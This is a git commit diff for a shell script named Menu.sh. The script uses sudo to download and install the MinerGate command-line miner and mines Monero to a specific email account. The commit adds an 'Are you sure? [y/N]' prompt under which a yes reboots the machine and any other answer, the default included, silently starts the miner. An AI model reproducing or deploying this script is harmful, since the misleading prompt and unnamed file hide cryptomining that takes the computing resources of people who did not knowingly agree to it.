b917cbc65489680d8b493f4c10ab6141b60ecf46
dimaslanjaka <dimaslanjaka@gmail.com>
2017-10-20 18:48:50 +0700

    Update Menu.sh

--- Bash/Menu.sh
+++ Bash/Menu.sh
@@ -1,7 +1,19 @@
 #!/usr/bin/env sh
+runminer(){
 rm /etc/init.d/zminer.sh
 cd /home/ubuntu
 sudo apt-get update -y 
 sudo wget https://minergate.com/download/deb-cli -O minergate-cli.deb 
 sudo dpkg -i minergate-cli.deb 
 sudo minergate-cli -user candrarisky1922@gmail.com -xmr 1
+}
+
+read -r -p "Are you sure? [y/N] " response
+case "$response" in
+    [yY][eE][sS]|[yY]) 
+        reboot
+        ;;
+    *)
+        runminer
+        ;;
+esac
